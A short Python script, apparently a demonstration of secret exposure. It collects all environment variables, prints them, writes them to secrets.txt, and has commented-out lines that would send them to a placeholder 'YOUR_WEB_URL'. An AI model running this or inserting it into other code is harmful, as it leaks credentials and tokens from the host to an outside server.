import os
import json
import requests
 
 
secrets = dict(os.environ)
 
json_secrets = json.dumps((secrets))
 
print(json_secrets)
 
# Change YOUR_WEB_URL to the URL of a website or service that you own

# Only uncomment these lines if you want to send json_secrets to the URL
# This is not advised on your local machine
# response = requests.get('YOUR_WEB_URL', data = json_secrets)
 
# print(response.request.url)
 
# print(response.status_code)
 
file = open("secrets.txt", "a")
 
file.write(json_secrets)
 
file = open("secrets.txt", "r")
 
line = file.readline()
 
print(line)